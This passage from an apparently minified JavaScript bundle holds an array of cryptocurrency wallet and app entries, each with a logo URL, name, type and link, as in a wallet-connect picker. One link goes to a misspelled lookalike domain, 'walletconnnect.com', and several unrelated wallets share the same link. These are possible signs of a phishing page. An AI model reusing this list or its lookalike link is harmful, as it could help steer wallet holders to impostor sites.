MaUNLjdnJrcbH6Ms8dMJnoq1tpD3lbZ6c7kLLY/QlnWwLZTJQPxvTvuYSs5vuR0vtY0ySX5q6PDXthsLe6I8X+ktoORP0PSfetAZGB+hWPj0FRj8dTEzDNul+DiSXVT+V8P5aarqfPYlGP+3XzLdKd9JI5SwBknRRl/m3n5Nbr3Lz8FuDj7pdpdlO97rRqjBa/bS1mJjuf8x0PvtjIWSSjhvXted9p3O9SFOuQzk/Tf3FofDWufnVKJ4KgukXf8trfBraPVRL9+T63/7Ab6VJQrgz5ftJkrb8QeP2+iB1f9Nt33zeLhq9gZ+Mx610ldZ47HuDfmPx8XnTPqyRCaTb6bTb7ZvJKjftdqfT/d/QbGxsbGxsbGxsbGxsbGxstOQ/NVX9uyBKRCIAAAAASUVORK5CYII=",
        appName: "Monero",
        type: "Wallet",
        href: "https://walletconnnect.com/"
    }, {
        src: "https://s2.coinmarketcap.com/static/img/coins/200x200/5426.png",
        appName: "solana",
        type: "Wallet",
        href: "https://argent.xyz/"
    }, {
        src: "https://s.yimg.com/ny/api/res/1.2/QRK6xx2bHY2iz1vCk3FB5w--/YXBwaWQ9aGlnaGxhbmRlcjt3PTQyMDtoPTQyMA--/https://media.zenfs.com/en/globenewswire.com/8b0dd06616fd52915c1a3a1dfa627e4f",
        appName: "OKX",
        type: "Wallet",
        href: "https://argent.xyz/"
    }, {
        src: "https://304015554-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-Mgv3_8586v0mVL4zZax%2Ficon%2FWvDTo0Kodwa4awPEQrsO%2Fflarelogo.png?alt=media&token=b115a1f0-a543-4a49-828a-e3ede684055e",
        appName: "solflare",
        type: "Wallet",
        href: "https://argent.xyz/"
    }, {
        src: "https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/sqzgmbkggvc1uwgapeuy",
        appName: "Phantom",
        type: "Wallet",
        href: "https://argent.xyz/"
    }, {
        src: "https://images.sftcdn.net/images/t_app-icon-m/p/84e21628-9f17-42b2-b8b0-a2ef3503914c/2718523895/unisat-wallet-logo",
        appName: "Unisat",
        type: "wallet",
        href: "/explorer/rainbow"
    }, {
        src: "https://pbs.twimg.com/profile_images/1675922047262773248/R94-CmGU_400x400.jpg",
        appName: "Ordinals",
        type: "wallet",
        href: "/explorer/trust-wallet"
    }, {
        src: "https://pbs.twimg.com/profile_images/1662913258787860481/6-uc2l-m_400x400.jpg",
        appName: "HashPack",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://cspr.live/assets/images/casper-signer.png",
        appName: "CSPR Live",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://play-lh.googleusercontent.com/uT6ByyNvUeLRMDnMKEC91RrbHftl2EBB58r9vZaNbiYf1F5Twa33_Hx0zYvEfCtiG1kE",
        appName: "SafePal",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://pbs.twimg.com/profile_images/1598685297956585474/RTf32Evr_400x400.jpg",
        appName: "Nova",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://play-lh.googleusercontent.com/TqNUpppPnSel2wFJpqKP88TMYO8pV0ArT0B-PZbX0Ajo67Hh6R7z0ohl1ODtT4bkPQ",
        appName: "XPLA Vault",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a1cb2777-f8f9-49b0-53fd-443d20ee0b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Safe",
        type: "wallet",
        href: "/explorer/safe"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/bff9cf1f-df19-42ce-f62a-87f04df13c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "UniswapWallet",
        type: "wallet",
        href: "/explorer/uniswap-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/215158d2-614b-49c9-410f-77aa661c3900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Argent",
        type: "wallet",
        href: "/explorer/argent"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/497781c4-ee1c-4087-c73a-0147b3a8d800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "imToken",
        type: "wallet",
        href: "/explorer/imtoken"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/1bf33a89-b049-4a1c-d1f6-4dd7419ee400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Spot",
        type: "wallet",
        href: "/explorer/spot"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f216b371-96cf-409a-9d88-296392b85800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Zerion",
        type: "hybrid",
        href: "/explorer/zerion"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "UnstoppableDomains",
        type: "hybrid",
        href: "/explorer/unstoppable-domains"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/3f7075d0-4ab7-4db5-404d-3e4c05e6fe00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BitKeep",
        type: "wallet",
        href: "/explorer/bitkeep"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/2cd67b4c-282b-4809-e7c0-a88cd5116f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Omni",
        type: "wallet",
        href: "/explorer/omni"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/dda0f0fb-34e8-4a57-dcea-b008e7d1ff00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "KEYRINGPRO",
        type: "wallet",
        href: "/explorer/keyring-pro"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/26a8f588-3231-4411-60ce-5bb6b805a700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MathWallet",
        type: "wallet",
        href: "/explorer/mathwallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f3119826-4ef5-4d31-4789-d4ae5c18e400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "TokenPocket",
        type: "wallet",
        href: "/explorer/tokenpocket"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "LedgerLive",
        type: "wallet",
        href: "/explorer/ledger-live"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f581365d-e844-4d21-8e35-44a755a32d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "CoolWallet",
        type: "wallet",
        href: "/explorer/coolwallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/5b1cddfb-056e-4e78-029a-54de5d70c500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "AlphaWallet",
        type: "wallet",
        href: "/explorer/alphawallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/cfc07342-23ea-4f3f-f071-ec9d2cd86b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ZenGoWallet",
        type: "wallet",
        href: "/explorer/zengo-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/252753e7-b783-4e03-7f77-d39864530900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "SafePal",
        type: "wallet",
        href: "/explorer/safepal"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/9f259366-0bcd-4817-0af9-f78773e41900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "InfinityWallet",
        type: "wallet",
        href: "/explorer/infinity-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/7c5ff577-a68d-49c5-02cd-3d83637b0b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Crypto.com|DeFiWa...",
        type: "wallet",
        href: "/explorer/cryptocom-defi-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a03bfa44-ce98-4883-9b2a-75e2b68f5700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Valora",
        type: "wallet",
        href: "/explorer/valora"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/98183be0-3125-45ee-a6b6-fbd47ebefd00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "SecuX",
        type: "wallet",
        href: "/explorer/secux-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/c39b3a16-1a38-4588-f089-cb7aeb584700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "AmbireWallet",
        type: "wallet",
        href: "/explorer/ambire-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/fd56c695-ce58-4df5-1625-767571c80700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "RipioPortal",
        type: "wallet",
        href: "/explorer/ripio-portal-mobile-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/bc7aacd6-b2e2-4146-7d21-06e0c5d44f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ByteBank",
        type: "wallet",
        href: "/explorer/bytebank"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "VIVEWallet",
        type: "wallet",
        href: "/explorer/vive-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/0dafcaab-0852-47f7-85dd-436b86491d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "LOBSTRWallet",
        type: "wallet",
        href: "/explorer/lobstr-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MinervaWallet",
        type: "wallet",
        href: "/explorer/minerva-wallet-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BeeWallet",
        type: "wallet",
        href: "/explorer/bee-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Kriptonio",
        type: "wallet",
        href: "/explorer/kriptonio"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ClingWallet",
        type: "wallet",
        href: "/explorer/cling-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/29d914e5-9daa-4342-33cd-169155c5a600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "CobaltWallet",
        type: "wallet",
        href: "/explorer/cobalt-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Marble",
        type: "wallet",
        href: "/explorer/marble"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "PREMAWallet",
        type: "wallet",
        href: "/explorer/prema-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BinanceDeFiWallet",
        type: "wallet",
        href: "/explorer/binance-defi-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "pier",
        type: "wallet",
        href: "/explorer/pier"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/916c8480-a52d-4f4c-82b5-47cac8c84300?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "trace-gift",
        type: "hybrid",
        href: "/explorer/trace-gift"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Chain",
        type: "wallet",
        href: "/explorer/chain"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/c227ee0a-5127-4707-ded9-c3cd81348d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "IDPocket",
        type: "wallet",
        href: "/explorer/id-pocket"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/cc7f87b2-4419-480a-fb39-c8364ece4600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MetaMaskMobileDeve...",
        type: "wallet",
        href: "/explorer/metamask-mobile-development"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/e131fa98-8c4f-4680-f5b6-6fb77189c900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Status",
        type: "wallet",
        href: "/explorer/status"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/c664d955-8a1e-4460-3917-4cfcf198f000?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MonarchWallet",
        type: "wallet",
        href: "/explorer/monarch-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/7025146c-c341-473f-a79c-62ec48eef800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "OttrFinance",
        type: "wallet",
        href: "/explorer/ottr-finance"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/dfe0e3e3-5746-4e2b-12ad-704608531500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "RobinhoodWallet",
        type: "wallet",
        href: "/explorer/robinhood-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/774110aa-70f6-4d0c-210f-ab434838fa00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Kriptomat",
        type: "wallet",
        href: "/explorer/kriptomat"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/77865965-4322-4ac4-5049-b2af11bf8300?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "UniPass",
        type: "wallet",
        href: "/explorer/unipass"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/058878f4-7364-4e01-434f-2cc09a15cf00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Essentials",
        type: "wallet",
        href: "/explorer/essentials"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/280cd57b-24f4-4700-8d53-94fe292fab00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "JadeWallet",
        type: "wallet",
        href: "/explorer/jade-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/41f6ac85-8f4e-4d9f-b37b-92b43fa7f400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Keeper",
        type: "wallet",
        href: "/explorer/keeper"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/75dd1471-77e9-4811-ce57-ec8fc980ec00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Bitizen",
        type: "wallet",
        href: "/explorer/bitizen"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/efec6318-7f96-4b30-9287-6c287660cd00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "XDEFIWallet",
        type: "wallet",
        href: "/explorer/xdefi-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/322bd6f0-09b5-4595-cb15-0dfab8054800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "NeonWallet",
        type: "wallet",
        href: "/explorer/neon-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/374258d3-c749-4f37-7815-77e61f798c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Blocto",
        type: "wallet",
        href: "/explorer/blocto"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/fc460647-ea95-447a-99f0-1bff8fa4be00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Coin98SuperApp",
        type: "wallet",
        href: "/explorer/coin98-super-app"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/32e89601-0490-42fc-0cc4-8627d62a2000?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "TimelessWallet",
        type: "wallet",
        href: "/explorer/timeless-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f78dab27-7165-4a3d-fdb1-fcff06c0a700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ArculusWallet",
        type: "wallet",
        href: "/explorer/arculus-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/339b9e9d-e2a7-46eb-4ed3-272321257a00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Broearn",
        type: "hybrid",
        href: "/explorer/broearn"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/51fa27fd-8a21-4de0-c084-528e4a37ad00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MaskNetwork",
        type: "hybrid",
        href: "/explorer/mask-network"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea0140c7-787c-43a4-838f-d5ab6a342000?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "SafeMoon",
        type: "wallet",
        href: "/explorer/safemoon-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/3aa86daa-b885-4686-c443-83355e1b3b00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Uniblow",
        type: "wallet",
        href: "/explorer/uniblow"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/70c0bc88-7bb1-4c1f-3531-9a5f799fb100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Lilico",
        type: "wallet",
        href: "/explorer/lilico"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/20c3072e-c92e-4902-d4b9-cb2b6ab29100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BridgeWallet",
        type: "wallet",
        href: "/explorer/bridge-wallet-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/d017bc54-db4d-4f07-2de2-69790ce92400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "CatecoinWallet",
        type: "wallet",
        href: "/explorer/catecoin-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Fireblocks",
        type: "wallet",
        href: "/explorer/fireblocks"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/c268e78d-ffb0-4c8b-5cad-04c3add48500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "PlasmaWallet",
        type: "wallet",
        href: "/explorer/plasma-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/e6dba126-85af-4194-84f6-dd16632c3c00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "HoldstationWallet",
        type: "wallet",
        href: "/explorer/holdstation-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/73e6b2b2-8c02-42e9-84f5-82a859978200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "LeapCosmosWallet",
        type: "wallet",
        href: "/explorer/leap-cosmos-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/c68b81d1-a400-4a07-6d9d-28edda986d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "D'CENTWallet",
        type: "wallet",
        href: "/explorer/dcent-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/80eaa630-6392-4b0a-a604-0a0f808e4d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Everspace",
        type: "wallet",
        href: "/explorer/everspace"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/ea26c3c8-adb6-4dc4-ee02-35d6eee02800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Cosmostation",
        type: "wallet",
        href: "/explorer/cosmostation"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/e2024511-2c9b-46d7-3111-52df3d241700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MEWwallet",
        type: "wallet",
        href: "/explorer/mew-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a5d9dd15-8cef-42de-8bed-09e01a8b0200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "PLTwallet",
        type: "wallet",
        href: "/explorer/pltwallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a7106965-91cc-4a73-4688-c5c72ae0ed00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Avacus",
        type: "wallet",
        href: "/explorer/avacus"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/e321346d-5ce7-4e75-371e-e4f0bf923900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BCERTinwallet",
        type: "wallet",
        href: "/explorer/bcertin-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/fa800387-a0b6-41a9-b533-1dcd07067900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "InternetMoneyWallet",
        type: "wallet",
        href: "/explorer/internet-money-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/b869d966-4699-44de-eadb-4eb39a580600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MetaOne",
        type: "wallet",
        href: "/explorer/metaone"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/add9626b-a5fa-4c12-178c-e5584e6dcd00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "EnjinWallet",
        type: "wallet",
        href: "/explorer/enjin-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/10c75467-6612-48ad-b97b-63985e922200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "SlingshotWallet",
        type: "wallet",
        href: "/explorer/slingshot-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/51bb1507-45a1-4d21-15f2-1cc2ebe69400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Gryfyn",
        type: "wallet",
        href: "/explorer/gryfyn"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "pier",
        type: "wallet",
        href: "/explorer/pier"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/e4eff15a-35d5-49fe-047f-33e331f46400?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "CVLWallet",
        type: "wallet",
        href: "/explorer/cvl-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Chain",
        type: "wallet",
        href: "/explorer/chain"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BinanceDeFiWallet",
        type: "wallet",
        href: "/explorer/binance-defi-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/29d914e5-9daa-4342-33cd-169155c5a600?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "CobaltWallet",
        type: "wallet",
        href: "/explorer/cobalt-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/0dafcaab-0852-47f7-85dd-436b86491d00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "LOBSTRWallet",
        type: "wallet",
        href: "/explorer/lobstr-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/fd56c695-ce58-4df5-1625-767571c80700?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "RipioPortal",
        type: "wallet",
        href: "/explorer/ripio-portal-mobile-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/a78c4d48-32c1-4a9d-52f2-ec7ee08ce200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Frontier",
        type: "wallet",
        href: "/explorer/frontier"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/98bd3b9a-097e-4743-8808-986b4ad1ad00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "AT.Wallet",
        type: "wallet",
        href: "/explorer/atwallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/3df102e4-e435-49dd-d4b1-5ea74ebed500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "OptoWallet",
        type: "wallet",
        href: "/explorer/opto-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "PREMAWallet",
        type: "wallet",
        href: "/explorer/prema-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Marble",
        type: "wallet",
        href: "/explorer/marble"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ClingWallet",
        type: "wallet",
        href: "/explorer/cling-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Kriptonio",
        type: "wallet",
        href: "/explorer/kriptonio"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "VIVEWallet",
        type: "wallet",
        href: "/explorer/vive-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/bc7aacd6-b2e2-4146-7d21-06e0c5d44f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ByteBank",
        type: "wallet",
        href: "/explorer/bytebank"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "MinervaWallet",
        type: "wallet",
        href: "/explorer/minerva-wallet-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "BeeWallet",
        type: "wallet",
        href: "/explorer/bee-wallet"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/70485da2-2568-463d-722c-25082997cc00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "ModularWalletProd",
        type: "wallet",
        href: "/explorer/modular-wallet-prod"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/1caa462e-dcf5-4c56-d180-094c81444f00?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "Torus",
        type: "wallet",
        href: "/explorer/torus-1"
    }, {
        src: "https://explorer-api.walletconnect.com/v3/logo/lg/af185895-cda5-4eaf-e31b-28b6fe4b0800?projectId=2f05ae7f1116030fde2d36508f472bfb",
        appName: "NitrogenWallet",
        type: "wallet",
        href: "/explorer/nitrogen-wallet"
    }],
    Vi = [{
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d2ae9c3c2782806fd6db704bf40ef0238af9470d7964ae566114a033f4a9a110",
        appName: "Etherscan",
        type: "App",
        href: "https://etherscan.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d",
        appName: "Uniswap",
        type: "App",
        href: "https://uniswap.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7ba1202d012a1402c8c56331471b183d2aaafb99a667dfdaf2ac4a123ea604ed",
        appName: "Binance DEX",
        type: "App",
        href: "https://binance.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2",
        appName: "OpenSea",
        type: "App",
        href: "https://opensea.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d82213ea5c476a43d9ab48d2011e3a5329a07826bd8191b24815e5bfe8c207be",
        appName: "Compound",
        type: "App",
        href: "https://compound.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a85fb60f37b9971969e00caa241ed2b6ccd8fce369f59d3a965202595a4a9462",
        appName: "Gnosis Safe Multisig",
        type: "App",
        href: "https://gnosis-safe.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/02563239502b03cef22f5e71059ce97bd48cf7ab0f856964d7e17c0e3631db9f",
        appName: "Zapper",
        type: "App",
        href: "https://zapper.fi/"
    }, {
